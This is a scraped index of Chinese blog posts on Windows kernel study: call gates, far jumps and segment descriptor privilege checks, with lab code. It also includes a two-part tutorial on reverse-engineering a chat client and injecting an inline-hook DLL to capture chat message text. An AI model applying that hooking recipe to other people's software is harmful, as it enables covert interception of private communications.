注意：这里的栈顶esp的值和刚刚不一样是因为程序重新执行了，进入0环时，ESP和SS是TSS给的，而TSS内的值是当前线程给的，因为代码修改了，所以重新执行程序时，线程不一样了，所以0环的堆栈也就不一样了。但是3环的数据是没有变的（理论上也是会变的，这里没变是因为编译器的优化），对比刚刚手动读取的结果来看，3环的ESP，CS，SS完全一致，说明刚刚调用门的实验成功提权进入0环。 有参调用门无参说完了，接下来是有参调用门，有参调用们和无参的区别在于仅仅是参数位的值会有所变动，栈里多了push进去的参数，其余和无参基本上相同。 构造调用门 这里构造的调用门描述符是：0040EC03 00081020，（地址变成了401020，是因为我重启了下虚拟机所以GetValue函数地址变了，并不影响），需要注意的是参数位设置成了3，因为这次计划传入3个参数进去。 代码实现由于Push了参数进去，所以不确定参数在0环堆栈中位于什么位置，于是先用int 3的方法，在Windbg中查看一下堆栈的情况 图中可以发现，在压入参数的调用门进入0环后，参数位于3环ESP和3环CS中间的位置，堆栈表示大致如下： 这样，就可以来编写代码了，总体和无参的差距不大。 c1234567891011121314151617181920212223242526272829303132#include \"stdafx.h\"int saveEax = 0;int para1, para2, para3;__declspec(naked) void GetValue() { __asm { mov saveEax, eax mov eax, [esp+8] mov para3, eax mov eax, [esp+0xc] mov para2, eax mov eax, [esp+0x10] mov para1, eax mov eax, saveEax retf 0xc }}int main(int argc, char* argv[]){ char buffer[6] = {0x0, 0x0, 0x0, 0x0, 0x4B, 0x0}; __asm { push 1 push 2 push 3 call fword ptr [buffer] } printf(\"%x, %x, %x\", para1, para2, para3); getchar(); return 0;} 需要注意一点，这里由于push了3个参数，所以长返回的时候要用RETF 0xc来平衡堆栈，否则直接中断到Windbg，要是不处理的话就蓝屏了。 代码执行效果如下，成功在0环堆栈取到了push进入的参数。 总结 当通过门，权限不变时，只会PUSH两个值：CS和返回地址，新的CS的值由调用门决定 当通过门，权限改变的时候，会PUSH四个值：SS，ESP，CS，返回地址，新的CS由调用门决定，新的SS和ESP由TSS提供 通过门调用时，要执行哪行代码由调用门决定，但使用RETF返回时，由堆栈中压入的值决定，也就是说，进门时，只能按指定路线走，出门时，可以翻墙（只要改变堆栈里面的值就可以想去哪去哪） 可不可以再建个门出去呢？也就是用Call，当然可以。 参考教程：https://www.bilibili.com/video/av68700135?p=17","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"长调用与短调用","slug":"长调用与短调用","date":"2020-03-14T01:29:45.000Z","updated":"2020-03-14T06:15:50.000Z","comments":true,"path":"2020/03/14/长调用与短调用/","link":"","permalink":"http://cata1oc.github.io/2020/03/14/%E9%95%BF%E8%B0%83%E7%94%A8%E4%B8%8E%E7%9F%AD%E8%B0%83%E7%94%A8/","excerpt":"","text":"在上一篇章中提过，实现跨段的跳转，可以使用JMP FAR指令，但是想要实现跨段的调用，就需要学习一个新的指令CALL FAR；CALL FAR指令要更为复杂一些，原因是JMP指令是不影响堆栈的，而CALL指令会影响堆栈。 短调用首先来回顾下短调用，短调用其实就是普通的CALL调用，是相对于CALL FAR而言，所以叫做短调用。短调用会影响EIP寄存器和ESP寄存器，因此在返回时需要额外去平衡一下堆栈；短调用属于三环知识，这里不再赘述，具体的调用和返回时的堆栈变化如下图所示： 长调用（跨段不提权）长调用分为提权和不提权两种，这里先讲不提权的情况。 这图看不明白没关系，一个个分析。首先，EIP为什么是废弃的？因为，这个长调用指令，压根不会跳转到你给的EIP的位置，而是会跳转到调用门里提供的地址。那什么是调用门呢?下一篇会具体提到， 这里简单概括调用门就是一种位于GDT表里特殊的描述符。 回到长调用这里，当CALL执行后，与一般的调用指令不同，长调用使得堆栈提升了8个字节，除了返回地址外，还压入了调用者的CS，以便在调用返回至原来程序时，CS也能得到恢复。其中返回地址依然是位于[esp]处，调用者的CS位于[esp+4]处。 长调用返回也与普通调用不同，普通调用使用ret指令即可返回到原来程序的位置，而长调用返回时需要使用长返回指令RETF，长返回指令除了会将返回地址送入EIP寄存器，还会将CS恢复至执行前的状态，同时平衡堆栈。 长调用（跨段并提权）不提权的长调用还稍微好理解一点，提权的长调用，就稍微有些复杂了，由于发生了提权，CS的CPL发生了改变，根据Intel的规定，CS和SS的CPL一定要保持一致，所以此时SS的值也会发生改变，除此之外，因为发生了提权，堆栈从3环的堆栈变为了0环的堆栈，因此ESP也会发生改变。所以提权的长调用会4个寄存器的值发生改变，分别是EIP，CS，ESP，SS，来看一下执行前后的变化 提权后，分别将返回地址，调用者CS，ESP，SS压入了0环的堆栈中，这样在返回3环时，可以确保这些寄存器恢复到原本的状态。 同样，提权后返回用的也是RETF，长返回指令，分别将返回地址，调用者的CS，ESP，SS压入相应的寄存器中，大致如下： 总结长调用相较长跳转更为复杂，这篇只是做个简单的介绍，在后面的篇章中，将通过分析调用门的实现过程来详细讲解长调用，这里对本篇提到的几个特点做些总结。 跨段调用时，一旦有权限切换，就会切换堆栈 CS的权限一旦改变，SS的权限也要随着改变，CS与SS的等级必须一样 JMP FAR只能跳转到同级非一致代码段或者共享段，但CALL FAR可以通过调用门提权，提升CPL的权限 参考课程 : https://www.bilibili.com/video/av68700135?p=16","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"代码跨段跳转（不提权）","slug":"代码跨段跳转","date":"2020-03-13T02:24:36.000Z","updated":"2021-07-31T08:47:27.314Z","comments":true,"path":"2020/03/13/代码跨段跳转/","link":"","permalink":"http://cata1oc.github.io/2020/03/13/%E4%BB%A3%E7%A0%81%E8%B7%A8%E6%AE%B5%E8%B7%B3%E8%BD%AC/","excerpt":"","text":"之前的篇章中提到过，除了CS段寄存器外，均可使用MOV或LES,LSS,LDS,LFS,LGS指令进行修改；为什么CS不可以直接被修改呢？ CS是代码段的段寄存器，CS的改变意味着EIP的改变，所以无法使用上述指令进行修改 代码跳转指令代码的跳转指令分为2种，一种是同时修改CS和EIP的指令，另一种，只修改EIP指令，具体如下： 同时修改CS和EIP：JMP FAR/ CALL FAR / RETF / INT / IRETD 只修改EIP：JMP / CALL / JCC / RET 本篇用到的是JMP FAR指令。 JMP FAR指令：和普通的JMP指令不同，JMP FAR实际是在JMP指令后写上6个字节，例如 JMP FAR 0x4B: 0x00401456的形式。 其中0x4B是段选择子，0x00401456是跳转地址。 若能成功执行，0x4B会写入CS中，0x00401456会写入EIP中，代码发生跳转。 代码跳转流程JMP 0x20:0x004183D7 CPU如何执行这行代码? 段选择子拆分0x20 对应二进制 0x0000 0000 0010 0000 RPL：00 TI：0 Index：4 查表得到段描述符 TI = 0 所以查GDT表 根据Index = 4 找到对应的段描述符 四种情况可以跳转：代码段、调用门、TSS任务段、任务门（其中调用门，TSS任务段以及任务门，都属于系统段） 之前段描述符的篇章提到过，可以根据段描述符的属性判断属于哪个段，通过看属性的那16位：由于代码段和数据段的S位值为1，所以一般第12-15位为字节9/F，而代码段的Type域的第1位为1，所以代码段的Type域一定大于等于8。因而判断代码段描述符的第8-15位通常在98-9F或者F8-FF这个范围内。 权限检查权限检查分为非一致代码段和一致代码段两种情况，下面我们分别来看 非一致代码段非一致代码段，要求：CPL == DPL 并且 RPL DPL(数值上)的例子： 这次我们修改一下段描述符，令属性变为c098，拆分可知，这是一个DPL = 0的非一致代码段 再次尝试执行： 结果跳转到了异常处理程序里，这说明了，在CPL > DPL的情况下，是不能跳转的。 至于RPL = DPL 这条件很奇怪，为什么要求访问一致代码段反而需要权限更小才允许访问呢？ 一致代码段又称作共享段，这是Windows给3环程序提供一些通用的功能，使得3环程序可以访问0环的一些代码段，这些功能并不会破坏内核，也不能提升3环程序的权限，因此可以让低权限的段访问。 下面我们来构造一个一致代码段的段描述符，具体如下，令属性为cf9f，是一个DPL = 0的一致代码段 单步执行 发现可以跳转，说明一致代码段是可以实现低权限程序进行跳转的。 加载段描述符其实根据上面的实验，也都知道跳转流程后面的步骤了，这里还是简要说下。当段权限检查通过后，CPU会将段描述符加载到CS段寄存器中 代码执行段描述符加载完后，CPU将 CS.Base + Offset（JMP FAR后面的那个跳转地址） 的值写入EIP 然后执行CS:EIP处的代码，段间跳转结束。 总结 为了对数据进行保护，普通代码段是禁止不同级别进行访问的。用户态的代码不能访问内核的数据，同样，内核态的代码也不能访问用户态的数据。 如果想提供一些通用的功能，而且这些功能并不会破坏内核数据，那么可以选择一致代码段，这样低级别的程序可以在不提升CPL权限等级的情况下即可以访问。 如果想访问普通代码段，只有通过“调用门”等提升CPL权限，才能访问。 参考教程：https://www.bilibili.com/video/av68700135?p=14 踩的一些坑G位/Limit限制一致代码段在一致代码段的实验过程中，我以为只要是满足属性是**9f/9e/9f/9c这样的一致代码段， 就一定可以跳转，结果并不是，而且很多都没有跳转。然后发现，实际上受到了G位或者Limit的限制，先说G位： G位是粒度位，用来设置Limit的单位，当G=1时，Limit的单位是4KB，当G=0时，Limit的单位是字节；这是段描述符的知识。为什么说G位会有影响呢，举个简单的例子，比如代码的载入地址是0x401420，你想通过一致代码段跳到0x401456的位置，如下图： 假设段描述符是004f9f00`0000ffff，这是一个DPL = 0的一致代码段，Base=00000000，Limit=FFFFF，由于粒度G=0，所以Limit就只有这么大，因此能够访问的地址，仅仅只有0~FFFFF这么大的范围，超过了这个范围，就访问不到了，而你的载入地址是0x401420，你想跳转到0x401456，这两个地址都访问不到，不在范围内，因此跳转是不可能成功的。 接下来再说说Limit，是不是只要G位，置1就可以了？这也不是，说到底还是和Limit写入段寄存器的大小有关，就算G位置1，假设段描述符是00c09f00-000000ff，这时段描述符描述的是一个DPL = 0的一致代码段，且G=1，Base = 00000000，这时我们来算一下Limit，Limit = (FF+1)*4KB - 1 = 100000 - 1 = FFFFF，发现了吧，结果还是FFFFF，范围和刚刚的一样，你还是跳转不了。那怎么办，就继续加呗，把段描述符改成00c09f00-00000fff，这样Limit算下来就是FFFFFF，可以跳转的范围就是0~FFFFFF，而0x401420和0x401456显然都在这个范围内。 Base到底改没改？这个问题困扰了大半个下午，试了半天没试出来个所以然，最后多亏Joney大哥（这是他的博客）解惑。那这是个什么情况呢？我们来康康： 根据代码跳转流程可以发现，在跳转执行前，会先将段描述符加载到段寄存器上，那也就是说，跳转前，CS的Base，Limit，Attribute，都来源于刚刚加载进来的段描述符。在上面这个坑中，已经阐述了G位和Limit对于一致代码段起到的限制作用，说明Attribute和Limit的确都是写入后的，那Base到底起没起作用呢？根据之前段属性探究的那篇可以知道：代码真正执行的地址其实是CS.Base+OFFSET，所以这次我们再次修改段描述符，这次修改成00cf9f00-0003ffff，这是一个DPL = 0的一致代码段，其中G=1，Limit=FFFFFFFF，Base=00000003。这样我们尝试执行代码JMP FAR 0x4B: 00401456，根据Base，猜测会跳到00401459的位置，结果： 还是跳到了0x00401456，难道段描述符没有修改Base？当我困惑的时候，Joney说，OD根本识别不出来Base到底改没改，所以一直默认CS.Base = 0，但其实已经改了！喔！原来如此！这是我们再添加两条指令，分别放在0x401456和0x401459的位置，然后单步： 不可思议的事情发生了！指令刚刚执行到0x401459说明前一个执行的指令是0x401456处的，但是观察右侧通用寄存器，修改的是ecx的值，而非eax的值，也就是说，刚刚执行的指令其实是位于0x401459处的add ecx, 1。这下终于搞清楚了，CS.Base的确得到了修改，只是OD没法正确的显示罢了。 同样，在执行完JMP FAR指令后，会发现，Limit = 0，长度=16bit的情况，这也是因为OD没法正确显示出跨段跳的结果。 以上就是在代码段跨段实验时遇到的两个坑，花费了些时间，但还是很有收获的，需要坚持下去。","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"一次简单的Hook（下）","slug":"一次简单的Hook-下","date":"2020-03-12T07:38:30.000Z","updated":"2020-03-12T15:23:43.627Z","comments":true,"path":"2020/03/12/一次简单的Hook-下/","link":"","permalink":"http://cata1oc.github.io/2020/03/12/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84Hook-%E4%B8%8B/","excerpt":"","text":"前一篇已经完成了对GetMsgAbstract函数的分析，发现，当执行到GetMsgAbstactByElement这一步时，已经可以根据寄存器用来传递的参数获取聊天内容，这篇来根据分析的内容编写用来Hook的dll。 Inline Hook这里先对Inline Hook做个简要概述，它是一种通过修改指令的方法，转移程序的执行流程，在程序执行某函数前或者某函数后，先执行你定义的Hook函数，拿到需要的参数信息，再根据需要对参数信息进行加工，从而完成Hook。常见的手法如下： Code11. jmp xxxxxxxx (5字节) Code12. push xxxxxxxx/retn (6字节) Code13. mov eax, xxxxxxxx/jmp eax (7字节) Code14. call Hook 根据需求不同，替换掉原本的指令长度不同，从而选择的手段也不同；本篇中采用6字节的方式 构建DLL一般构建一个dll要分别去编写头文件，C/C++源文件以及入口点函数。首先我们先从头文件开始。 头文件 打开Visual Studio，新建一个动态链接库(DLL)项目，VS会自动帮忙生成头文件和源文件，点击头文件stdafx.h开始编写 其实VS已经帮忙生成好了大部分，只需要定义自己需要实现的函数和方便自己使用的宏即可 这里为什么不写成下面这种形式呢？ c1__declspec(dllexport) BOOL WINAPI Msg_Hook(); 因为这个dll的主要作用是hook，并不需要有导出函数，即使有了被我们hook的程序也不会主动去调用（因为它的代码里面根本没有调用我的dll的代码），所以干脆就不写了，没什么影响。 入口点函数VS帮我们生成好的入口点函数如下： 在这里其实只需要把刚刚定义的函数，写在DLL_PROCESS_ATTACH的地方即可，因为在dll加载到进程时，会先调用入口点函数，传入的参数则是DLL_PROCESS_ATTACH，这样就可以调用我们的Hook函数了。 源文件源文件的编写是比较关键的一步，主要功能的实现都在这里。首先，我们需要实现Hook用的函数。 Hook函数 首先编写一个大致的框架，来分析一下都做了些什么，还缺一些什么。 Inline Hook的核心在于修改指令，从而实现程序流程的转移。具体的流程就是，找到需要修改的位置，修改当前位置的指令。 修改指令的大小这里采用的是push xxxxxxxx/retn的手法，所以需要创建一个6个字节的char型数组。 修改的位置修改的位置如何确定？之前在OD分析反汇编程序时，确定在调用GetMsgAbstractByElement之前就可获取到消息内容，发现，调用这个函数的call语句加上之前的push eax，刚好6个字节，这就是Hook点了 这个位置位于KernelUtil.dll中，所以我们可以补充第三条语句改成如下： Code1DWORD modify_addr = (PROC)GetModuleHandle(\"KernelUtil.dll\") + EntryOFFSET; 同时也可以根据基址确定EntryOFFSET并写在开头。 如何修改？这里采用Windows提供的ReadProcessMemory和WriteProcessMemory这两个函数，参数非常好理解，当前进程，需要修改的地址位置，修改的字节，修改字节的长度以及一个可以忽略的参数。在读的时候，指定位置的指定大小的字节会被保存进定义的char型数组里，写的时候就是把修改后的字节写回原来的地址。那我们要如何确定该写什么呢？ 根据push xxxxxxxx/retn指令，可以确定第一个字节和最后一个字节分别为0x68和0xC3。中间的4个字节填什么？就是执行我们做手脚的函数地址了。Hook函数的作用就是转移程序执行的流程，将程序转移到我们自己定义的函数，我们自己的函数就可以对当前的程序做些手脚，比如读取函数接收的参数，并将其传递出来。 目前为止，经过分析，可以进一步完善源程序。 接下来，就来编写自己的函数，将消息内容传递出来。 功能函数功能函数其实就是用汇编写一个裸函数，为啥要用裸函数？这样的话，编译器就不会自动帮我们生成如下这三行指令： Code123push ebpmov ebp, espsub esp, 0x20 而是我们自己平衡堆栈，所以就可以避免很多额外的偏移造成的麻烦，经过上一篇的分析已知，当函数到达GetMsgAbstractByElement的位置处时，可以通过[[ebx+0x28]]+0x18获取消息内容。那就可以采用一下方式： Code123456pushadpushfdmov eax, [ebx+0x28]mov eax, [eax]mov eax, [eax+0x18]mov Msg, eax 这样只要在外部定义一个变量Msg，即可将消息取到，然后可以利用OutputDebugString将消息内容输出到DbgView里观察。 但这还没有结束，因为之前覆盖掉了GetMsgAbstractByElement，所以这次需要重新再调用一遍。所以我们需要获取GetMsgAbstractByElement的地址，先通过当前地址和基址相减算出偏移0xBE0B0，然后通过KernelUtil.base+Offset确定函数的地址。这时只需要在平衡堆栈后的地方，补上之前替换掉的6个字节即可。 最终功能函数实现如下： 实验结果我们使用OD，将编写的dll注入进去 注入后此处代码发生了变化 观察DbgView，发现成功拿到消息内容","categories":[],"tags":[{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"}]},{"title":"段权限检查（数据段）","slug":"段权限检查","date":"2020-03-11T01:55:19.000Z","updated":"2021-10-23T06:13:31.094Z","comments":true,"path":"2020/03/11/段权限检查/","link":"","permalink":"http://cata1oc.github.io/2020/03/11/%E6%AE%B5%E6%9D%83%E9%99%90%E6%A3%80%E6%9F%A5/","excerpt":"","text":"访问违例问题在介绍内容前，先看两个程序 两个程序的差异仅仅在于段选择子的不同，结果则是一个访问成功另一个访问违例了。分别对两个段选择子进行拆分： Code10023 = 0000 0000 00100 0 11 RPL：3 Index : 4 Code1002B = 0000 0000 00101 0 11 RPL：3 Index : 5 可以看出，两个段选择子的差别仅在Index的不同，也就是指向的段描述符不同，再来看看两个段选择子对应的段描述符 注意：由于Index是从0开始算的（和数组一样），所以对应的实际上是表中第五个和第六个段描述符。 根据之前段描述符属性的内容，来查看属性位，分别为： Code1Attr: CFF3 DPL:3 Code1Attr: 008B DPL:0 可以发现，两个段描述符的DPL不同，之前在段选择子的篇章中提到过，在将段选择子指向的段描述符加载到段寄存器时，一定要保证数值上（RPLDPL。那为什么RPL>DPL就会出错呢？下面来逐步解析。 CPU分级先来了解一下CPU分级 CPU共划分了4个等级，Ring0~Ring3，其中Ring3级别最低，Ring0级别最高。这个分级是CPU划分的，并不是操作系统所划分的，操作系统只是使用了这个分级，其中Windows系统只用了Ring3和Ring0两个等级，分别表示应用级和系统级。应用级的程序往往不能访问系统级，所以保护模式不仅仅是防止段的胡乱访问，还保证了程序在相应的级别稳定的运行。 CPLCurrent Privilege Level，当前特权级，之前段选择子篇章中讲过，段选择子的后2位的值为RPL，而CPL指的CS或SS中的段选择子的后2位（CS/SS的后两位一定是相同的，所以无论用哪个作为CPL都一样），也就是说CS或SS的RPL就是当前程序的CPL。 下面来查看两个CPL： 随便拖一个程序进入OD，根据CS/SS可以算出当前程序的CPL为3。因为这些程序都是Ring3的程序。 按Ctrl+Break在Windbg中断下，查看寄存器，可以发现当前CPL为0。因为Windbg在调试系统时执行的都是内核函数，所以处在Ring0。 DPL Descriptor Privilege Level：描述符特权级别。在段描述符属性那一篇中解析DPL时提到过，在段描述符高4字节的第13~14位就是DPL，那么DPL到底有什么用呢？和CPL有什么关系呢？ DPL存储在段描述符中，规定了访问该段所需要的特权级别是什么。 通俗的理解：如果你想访问我，那么你应该具备什么特权。例如： Code1mov ds, ax 如果ax指向的段DPL = 0 但当前程序的CPL = 3 这行指令是不会成功的，因为CPL = 3是应用层，权限较低，是不能访问DPL = 0的系统层的；这也是为什么之前的例子中会出现访问违例。 RPLRequest Privilege Level：请求特权级别 有小盆友可能会问了，既然已经有CPL和DPL，那只要CPL","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"一次简单的Hook（上）","slug":"一次简单的Hook-上","date":"2020-03-10T01:36:42.000Z","updated":"2020-12-07T02:49:31.237Z","comments":true,"path":"2020/03/10/一次简单的Hook-上/","link":"","permalink":"http://cata1oc.github.io/2020/03/10/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84Hook-%E4%B8%8A/","excerpt":"","text":"这一次hook小实验的目标是hook出某社交软件中的实时聊天内容，主要目的是了解hook的原理以及在hook之前对程序的分析流程及其他准备工作，从而对于hook有个完整的认识。 准备工具 OllyDbg调试器：用于单步跟踪，动态调试等。 IDA pro调试器：用于静态分析函数代码结构等。 Mircosoft Visual Studio 201*(版本随意)：用于dll代码编写 DbgView：捕获并查看程序中由OutputDebugString输出的信息。 Hook的分类Hook无非只有两种类型，一种是通过修改数据（通常是引用的函数地址）进行的Hook，这如何理解，简单而言，很多大型程序，都需要通过调用各式各样的函数库来实现一些功能，而这种Hook就是通过修改程序调用的函数地址，改成自己写的函数，从而额外实现一些功能，实现对程序的Hook，例如IAT Hook；另一种是直接修改函数内的指令进行Hook，通过控制函数内的跳转，在函数执行时，实现一些自己的功能，然后再返回到函数使之正常运行，例如Inline Hook。这次Hook实验，采用的就是Inline Hook的手法实现。 基址与偏移在逆向分析中，通过基址和偏移定位一个函数，会非常方便，同时可以对IDA的代码进行基址重定位，从而达到和OD的同步分析。 如何确定基址呢，一个程序需要调用一个外部的库函数，或者加载dll来实现某些功能，当dll被加载进程序时，会根据默认基址0x10000000进行载入dll，但是一个程序往往会加载多个dll，此时dll会根据重定位表来对dll进行重定位，基址也会有所变化。由于dll中的导出函数，距离基址的偏移是固定的，所以只要确定需求函数与dll基址的偏移，就可以轻松定位到这个函数。如图，将程序被OD附加时，通过点击上方的E按钮，进入模块列表，左边第一栏的Base就是dll的基址，例如IM.dll在此次加载时的基址为0x62840000。 右键View name查看IM.dll的导出函数，可以发现此次加载时PostTask_Session这个函数的地址为0x628E6EF9，相减可得偏移为0xA6EF9，以后每次只需确定IM.dll的基址，就可以通过偏移直接确定PostTask_Session的地址，这在hook代码中很有用。 程序分析流程查找需要被Hook函数根据我们需要Hook的功能来看，要截取实时聊天的数据，需要对接收聊天内容的函数做手脚，猜想这个函数的函数名一定与Message有关，例如GetMessage，RecvMessage等。将程序附加进OD，点击E查看Tim加载的主要模块(dll)，找到一个KernelUtil.dll，为啥找这个dll呢？根据之前逆向，发现很多功能都是由这个dll实现的，从dll名也可以看出这是一个实现功能的dll。右键View name，查看dll的导出函数。 查看和Message有关的函数，最终会发现一个名为GetMsgAbstract的导出函数 为什么选这个函数呢？因为看名字猜测这是一个获取消息摘要的函数，也许和收发消息有一定的关联，因此可以拿出来进行试一试。 在函数的开头，下一个断点，然后在Tim内任何发送一条消息。发现程序断了下来，说明这个函数的确和消息有关。 寻找聊天内容尽管确定了，这个函数和聊天消息有关，但是只有真正找到了消息内容，这个函数才能够被利用，否则还得换另一个函数分析。首先按照F8单步执行(不步入函数，为了节省时间并快速定位)，每当一个函数(call语句)执行完后，都要观察堆栈和寄存器的变化，看看是否有重要内容。继续单步，直到发现一个函数GetMsgAbstractByElement，这个函数执行完后，会在堆栈[ebp-8]的位置出现刚刚发送的消息。 这时，我们可以进入GetMsgAbstarctByElement（这里Abstract拼错了，但只能按照他的函数名来），来寻找发送的消息是如何出现的。 函数入口 右图开始分析，在调用GetMsgAbstarctByElement之前，共push了5个参数进去，其中第一个push进去的参数0x548FA04，此时所指向的堆栈中的值为0，第三个push进去的0x548FA01，所指位置，截断了堆栈中部分数据，也无意义。第四个push进去的参数，值为0，同样也用不到。第五个push进去的参数，首先将[ebp-8]处的地址加载到eax，然后再push进去，根据前一次的步入，已知函数执行后，[ebp-8]的位置即是发送的消息，但该参数用于存放取完后的消息，并不是消息的源头。这样就只剩下第二个参数，右键ebx，Follow in dump，进入数据窗口，并没有发现消息内容的存在，因此可以猜测，这是一个包含了消息的结构体，至于如何解构结构体获取消息，还得步入GetMsgAbstarctByElement函数作进一步分析。 GetMsgAbstarctByElement函数按F7步入函数 可以发现，栈顶足足降低了0x70字节，所以push进来的参数暂时只能靠[ebp+偏移]来访问，关注点仍然放在第二个参数的值上，目前除了ebx仍然为此值，push进入堆栈，目前位于[ebp+0x14]的位置，值也相同，由于[ebp+0x14]是作为参数push进来的，所以ebx的值多半用不到了，接下来只需关注[ebp+0x14]的值。 同一张图，距离函数开始不远，就有一条赋值语句将[ebp+0x14]的值赋给edi，这时edi的值也会成为第二个参数的值，同样需要关注。接着继续单步分析。 单步执行到这里时发现，在一次函数调用前，将edi作为参数push了，此外又将[ebp-0x20]处的位置清零，需要留意关注（这种操作通常是清空返回地址处的值），然后单步步过该函数观察变化。 该函数执行后发现，[ebp-0x20]处的位置多了个数，右键-Follow in dump，进入数据窗口发现，在0x18偏移的位置，正好是发送的消息。这下就可以确定，是此处的call dword ptr ds:[eax + 0x48]这条语句，将传入的参数结构体进行解构，找到了消息。 解构参数结构体的函数接下来重新运行程序，再发送一条新的消息并断下。单步到call dword ptr ds:[eax + 0x48]处，按F7单步进入该函数。 这个函数并不长，但是实现了很关键的功能 Code1mov ebx,dword ptr ss:[ebp+0x8] 这一步，将[ebp+8]的值给到ebx，而这个值恰好就是外部传进来的需要解构的结构体，接下来需要关注涉及到ebx的指令。 其中接下来一条，将[ebx+0x38]的地址赋给eax，但是eax接下来就被重新赋值了，所以只需向下关注，其中这里方框框住的两行，实际上做了个减法运算，之后eax的值再一次被重置。接下来的一步，ecx也被清零了。 Code1mov eax,dword ptr ds:[ebx+0x28] 这是非常关键的一步，为什么说它关键呢，因为这时候已经脱离了ebx，说明ebx已经将结构体内部的信息传递给了eax上了，接着继续看eax，同时跟进[ebx+0x28]数据窗口查看。 Code1mov eax,dword ptr ds:[eax+ecx*4] => mov eax,dword ptr ds:[eax] 由于ecx的值为0，便可做一个优化。此时再去跟进[eax]数据窗口查看。 发现，刚好有一条发送出去但是还未接收到的消息。至此大功告成，已经确定GetMsgAbstractElement函数的解构过程： 首先将外部传入的第二个参数，赋值给edi寄存器暂存 接着将edi寄存器内的值作为参数，传入到一个解析结构体的函数内 进入函数，先将原先edi寄存器保存的参数，赋值给ebx寄存器 然后将ebx+0x28所在地址的值赋值给eax寄存器 最后eax寄存器将保存的值作为地址，进入后发现，在0x18处偏移，刚好就是保存的消息。 结论验证通过上述分析可以发现，在执行GetMsgAbstractElement，就可以通过其第二个push进去的参数，获取到消息内容了。这时，我们再次运行重新，发送消息，并重新断下。通过之前推论得出的偏移来计算： Code1[[ebx+0x28]]+18 该命令可以达到一个地址，而这个地址就应该存着消息。 验证成功。尽管我们是从GetMsgAbstract进来开始分析的，但是在分析的过程中发现GetMsgAbstractElement在执行前，就可以拿到消息内容，而GetMsgAbstract，执行的过程中总会执行GetMsgAbstractElement，因此可以在GetMsgAbstractElement函数执行前做手脚，注入我们的代码实现对消息内容的Hook。至于Hook代码的编写，限于篇幅，将在下一个部分呈现","categories":[],"tags":[{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"}]},{"title":"段描述符属性","slug":"段描述符属性","date":"2020-03-09T09:19:09.000Z","updated":"2020-12-06T02:04:15.083Z","comments":true,"path":"2020/03/09/段描述符属性/","link":"","permalink":"http://cata1oc.github.io/2020/03/09/%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%B1%9E%E6%80%A7/","excerpt":"","text":"之前介绍了，段描述符是用来填充段寄存器余下位置的，然而段寄存器余下位置有80位，而段描述符仅有64位，那到底是如何填充的呢？这篇就从这个问题开始，逐步探究段描述符的属性。首先，回顾一下段描述符的结构： P位P位，位于段描述符高4字节的第15位，是判断描述符是否有效的位置。 P = 1：该描述符有效 P = 0：该描述符无效 G位在解析G位前，先来回顾下之前的问题，64位的段描述符到底是如何分配给段寄存器余下80位的。 首先回顾一下段寄存器的结构： c123456struct SegMent { WORD selector; WORD attribute; DWORD base; DWORD limit;} 段选择子： 由mov/les/lds/lss/lfs/lgs指令直接写入16位。 属性：段描述符中高4字节的第8-23位，刚好16位，作为属性写入段寄存器。 基址：将段描述符高4字节中第24-31位，与第0-7位拼接成作为高16位，低四字节的第16-31位作为低16位，拼接成32位，作为Base，写入到段寄存器里。 (这里没用~号是因为会转义成删除线) 限长：这里就要用到G位了。首先观察段描述符结构，可以发现，在高4字节的第16-19位，与低4字节的第0-15位，都是段限长，将他们拼接起来，也就是20位，那这20位是如何扩展成32位呢？这里就要用到这部分的关键G位了，当G的值为0时，表示以字节为单位，这时，假设Limit的值加起来为FFFFF(20位)，则取0x000FFFFF作为Limit写入段寄存器；当G的值为1时，表示以4KB为单位，这样去理解，如果一个段的大小为1KB，也就是1024B或0x400B，这时，实际上能取的范围是0-1023或0-0x3FF，所以此时的Limit应该为3FF。这样当以单位为4KB来计算一个段的Limit时，若Limit的值为1，说明可以取0和1两个值，也真正的大小实际上是2，所以用2*4KB=8192B=0x2000B，但是真是可以取到的值为0-1FFF，所以此时写入段寄存器Limit的值为1FFF。同理，若段描述符Limit的值为FFFFF，真正写入段寄存器的值为FFFFFFFF(32位)。 具体的公式如下： Code12345G = 0: = LimitG = 1: (Limit + 1)*4KB - 1 = Limit*4KB + 4KB - 1 = (Limit","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"段描述符与段选择子","slug":"段描述符与段选择子","date":"2020-03-08T11:31:33.000Z","updated":"2021-06-06T16:18:22.370Z","comments":true,"path":"2020/03/08/段描述符与段选择子/","link":"","permalink":"http://cata1oc.github.io/2020/03/08/%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E6%AE%B5%E9%80%89%E6%8B%A9%E5%AD%90/","excerpt":"","text":"在探究段寄存器属性时，注意到，段寄存器在读的时候，只读了16位，但是写的时候会写入96位。那么，段寄存器是如何做到写入96位的呢？今天就要研究两个新的概念：段描述符与段选择子 基础知识Windbg指令Windbg是在调试Windows系统内核时常用的一个调试器，之后也会多次用到；通过Windbg可以实现主机对虚拟机上的Windows系统进行双机调试。搭建双机调试环境可以参考此贴：https://blog.csdn.net/q1007729991/article/details/52710390 这里，简单介绍一下，在研究段描述符和段选择子所需用到的几个Windbg指令： 命令 含义 r 查看和修改寄存器 dd 以4字节分隔，显示指定内存区域的数据内容 dq 以8字节分隔，显示指定内存区域的数据内容 第二个d和q分别是dword和qword的意思，第一个d是一个查看内存的指令，以后会详细说明。 